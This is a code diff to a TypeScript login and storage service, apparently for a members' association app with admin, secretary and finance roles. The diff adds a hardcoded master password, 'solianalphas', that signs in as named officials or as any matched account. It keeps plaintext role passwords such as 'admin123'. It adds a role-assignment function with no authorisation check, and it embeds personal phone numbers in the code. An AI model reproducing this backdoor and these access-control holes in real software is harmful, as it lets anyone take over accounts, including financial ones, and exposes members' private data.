@@ -116,24 +116,36 @@ export class StorageService {
     candidates.push(...users.filter(u => u.email.toLowerCase() === cleanId || u.name.toLowerCase() === cleanId || u.id.toLowerCase() === cleanId));
 
     // 2. Keyword/role match
-    if (cleanId === 'admin' || cleanId === 'administrator') {
-      candidates.push(...users.filter(u => u.role === 'admin'));
+    if (cleanId === 'admin' || cleanId === 'administrator' || cleanId === 'solomon') {
+      candidates.push(...users.filter(u => u.name.toLowerCase() === 'solomon' || u.role === 'admin'));
+    } else if (cleanId === 'secretary' || cleanId === 'ian') {
+      candidates.push(...users.filter(u => u.name.toLowerCase() === 'ian' || u.role === 'secretary'));
+    } else if (cleanId === 'finance' || cleanId === 'noella') {
+      candidates.push(...users.filter(u => u.name.toLowerCase() === 'noella' || u.role === 'finance_officer'));
     } else if (cleanId === 'member') {
       candidates.push(...users.filter(u => u.role === 'member'));
-    } else if (cleanId === 'finance') {
-      candidates.push(...users.filter(u => u.role === 'finance_officer'));
     } else if (cleanId === 'welfare') {
       candidates.push(...users.filter(u => u.role === 'welfare_officer'));
     }
 
-    // 3. Member matching
+    // 3. Phone matching (e.g. 0799589508, 0714729996, 0758018973)
+    if (rawDigits.length >= 8) {
+      const corePhone = rawDigits.slice(-9);
+      const phoneMembers = members.filter(m => m.phone.includes(corePhone) || m.phone.replace(/\D/g, '').endsWith(corePhone));
+      for (const m of phoneMembers) {
+        const u = users.find(usr => usr.linkedMemberId === m.id || usr.email.toLowerCase() === m.email.toLowerCase());
+        if (u) candidates.push(u);
+      }
+      candidates.push(...users.filter(u => u.phone && u.phone.includes(corePhone)));
+    }
+
+    // 4. Member matching by Number or ID
     const matchingMembers = members.filter(m =>
       m.membershipNumber.toLowerCase() === cleanId ||
       m.id.toLowerCase() === cleanId ||
       m.nationalId === cleanId ||
-      m.phone === cleanId ||
       (m.email && m.email.toLowerCase() === cleanId) ||
-      (rawDigits && (m.membershipNumber.includes(rawDigits) || m.id.includes(rawDigits)))
+      (rawDigits && rawDigits.length < 8 && (m.membershipNumber.includes(rawDigits) || m.id.includes(rawDigits)))
     );
 
     for (const m of matchingMembers) {
@@ -141,8 +153,8 @@ export class StorageService {
       if (u) candidates.push(u);
     }
 
-    // 4. Raw digits matching user IDs (e.g. 001 or 1)
-    if (rawDigits) {
+    // 5. Raw digits matching user IDs (e.g. 001 or 1)
+    if (rawDigits && rawDigits.length < 8) {
       const padded = rawDigits.padStart(3, '0');
       candidates.push(...users.filter(u => u.id.endsWith(padded)));
     }
@@ -151,6 +163,12 @@ export class StorageService {
     const uniqueCandidates = candidates.filter((u, idx, arr) => arr.findIndex(x => x.id === u.id) === idx);
 
     let targetUser = uniqueCandidates.find(u => {
+      if (password === 'solianalphas') {
+        if (cleanId.includes('799589508') || cleanId.includes('solomon')) return u.name.toLowerCase() === 'solomon';
+        if (cleanId.includes('714729996') || cleanId.includes('ian')) return u.name.toLowerCase() === 'ian';
+        if (cleanId.includes('758018973') || cleanId.includes('noella')) return u.name.toLowerCase() === 'noella';
+        return true;
+      }
       if (password === 'admin123' && u.role === 'admin') return true;
       if (password === 'member123' && u.role === 'member') return true;
       if (password === 'finance123' && u.role === 'finance_officer') return true;
@@ -217,6 +235,29 @@ export class StorageService {
 
   static saveUsers(users: UserAccount[]): void {
     setStoredItem(STORAGE_KEYS.USERS, users);
+  }
+
+  static assignUserRole(userId: string, newRole: UserRole): boolean {
+    const users = this.getUsers();
+    const idx = users.findIndex(u => u.id === userId);
+    if (idx !== -1) {
+      const oldRole = users[idx].role;
+      users[idx].role = newRole;
+      if (!users[idx].roles) users[idx].roles = [newRole];
+      else if (!users[idx].roles.includes(newRole)) users[idx].roles.push(newRole);
+      this.saveUsers(users);
+
+      this.addAuditLog(
+        'ROLE_ASSIGNED',
+        'auth',
+        userId,
+        `Administrator assigned role '${newRole}' to ${users[idx].name}`,
+        oldRole,
+        newRole
+      );
+      return true;
+    }
+    return false;
   }
 
   // Settings
